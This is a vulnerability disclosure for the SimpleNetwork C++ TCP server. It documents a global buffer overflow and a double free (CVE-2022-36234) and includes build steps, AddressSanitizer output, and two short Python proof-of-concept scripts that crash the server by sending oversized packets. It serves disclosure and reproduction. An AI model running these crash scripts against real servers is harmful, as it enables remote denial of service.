## Compiling the project

```
$ cd src
$ make
$ cd ../example-server
$ make
```

## Global Buffer Overflow


Server commit 29bc615f0d9910eb2f59aa8dff1f54f0e3af4496 suffers from a global buffer overflow when the TCPServer receives a single large packet containing ASCII characters. Using the following python3 script will invoke a global buffer overflow:

```
import socket

host = "localhost"
port = 1234                   
buf = b'A'*50000

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.sendall(buf)
    data = s.recv(1024)
    s.close()
    print('Received', repr(data))
except:
    print("Finished...")
```


#### Compiling the project with address sanitizer helps confirm this issue.  Here is the makefile for the example TCPServer:

```
all: 
        g++ -Wall -o server server.cpp -I../src/ ../src/TCPServer.cpp ../src/TCPClient.cpp -std=c++11 -lpthread -fsanitize=address

```


Address Sanitizer Output:

```
=================================================================
==15095==ERROR: AddressSanitizer: global-buffer-overflow on address 0xaaaae7e8f5c0 at pc 0xaaaae7e5b684 bp 0xffffa1efe720 sp 0xffffa1efe738
WRITE of size 1 at 0xaaaae7e8f5c0 thread T2
    #0 0xaaaae7e5b680 in TCPServer::Task(void*) (/home/kali/projects/SimpleNetwork/example-server/server+0xb680)
    #1 0xffffa595edd4 in start_thread nptl/pthread_create.c:442
    #2 0xffffa59c7e58 in thread_start ../sysdeps/unix/sysv/linux/aarch64/clone.S:79

0xaaaae7e8f5c0 is located 0 bytes to the right of global variable 'msg' defined in '../src/TCPServer.cpp:3:6' (0xaaaae7e855c0) of size 40960
0xaaaae7e8f5c0 is located 32 bytes to the left of global variable 'num_client' defined in '../src/TCPServer.cpp:4:5' (0xaaaae7e8f5e0) of size 4
SUMMARY: AddressSanitizer: global-buffer-overflow (/home/kali/projects/SimpleNetwork/example-server/server+0xb680) in TCPServer::Task(void*)
Shadow bytes around the buggy address:
  0x15655cfd1e60: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x15655cfd1e70: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x15655cfd1e80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x15655cfd1e90: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x15655cfd1ea0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x15655cfd1eb0: 00 00 00 00 00 00 00 00[f9]f9 f9 f9 04 f9 f9 f9
  0x15655cfd1ec0: f9 f9 f9 f9 04 f9 f9 f9 f9 f9 f9 f9 01 f9 f9 f9
  0x15655cfd1ed0: f9 f9 f9 f9 00 00 00 f9 f9 f9 f9 f9 00 00 00 f9
  0x15655cfd1ee0: f9 f9 f9 f9 00 00 00 00 00 00 f9 f9 f9 f9 f9 f9
  0x15655cfd1ef0: 00 00 00 00 01 f9 f9 f9 f9 f9 f9 f9 00 00 00 00
  0x15655cfd1f00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
Thread T2 created by T0 here:
    #0 0xffffa5dda234 in __interceptor_pthread_create ../../../../src/libsanitizer/asan/asan_interceptors.cpp:207
    #1 0xaaaae7e5c360 in TCPServer::accepted() (/home/kali/projects/SimpleNetwork/example-server/server+0xc360)
    #2 0xaaaae7e566bc in main (/home/kali/projects/SimpleNetwork/example-server/server+0x66bc)
    #3 0xffffa590777c in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58
    #4 0xffffa5907854 in __libc_start_main_impl ../csu/libc-start.c:381
    #5 0xaaaae7e543ec in _start (/home/kali/projects/SimpleNetwork/example-server/server+0x43ec)

==15095==ABORTING

```

# CVE-2022-36234

SimpleNetwork TCP Server commit 29bc615f0d9910eb2f59aa8dff1f54f0e3af4496 was discovered to contain a double free vulnerability which is exploited via crafted TCP packets. Triggering the double free will allow clients to crash any SimpleNetwork TCP server remotely. In other situations, double free vulnerabilities can cause undefined behavior and potentially code execution in the right circumstances.

# Reproduction

To ensure you have the standard build tools required to compile the library, install the following packages (on most systems this will already be installed):

```
sudo apt-get install build-essential git
```

The vulnerability can be reproduced by sending consecutive requests to the server containing a large buffer of characters in a TCP packet.  First, compile the 'libSimpleNetwork' library and example server provided in the source code:

```
git clone https://github.com/kashimAstro/SimpleNetwork.git
cd SimpleNetwork
git checkout 29bc615f0d9910eb2f59aa8dff1f54f0e3af4496
cd src
make
cd ../example-server
make
```

### Start the example-server:

```
./server 80 1
```

### Save the following python3 proof of concept script to a file (modify the host as needed):
```
import socket

host = "localhost"
port = 80                   # The same port as used by the server
buf = b'A'*10000

try:
    for i in range(50):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        s.sendall(buf)
        data = s.recv(1024)
        s.close()
        print('Received', repr(data))
except:
    print("Completed...")
```

### Execute the python3 script:

```
python3 poc.py
```

### Crash verification:
If successful, the server will crash and you will see the following output from the application:
```
segmentation fault  ./server 80 1
```


# References

* https://owasp.org/www-community/vulnerabilities/Doubly_freeing_memory
* https://cwe.mitre.org/data/definitions/415.html
* https://github.com/kashimAstro/SimpleNetwork/issues/22
* https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-36234
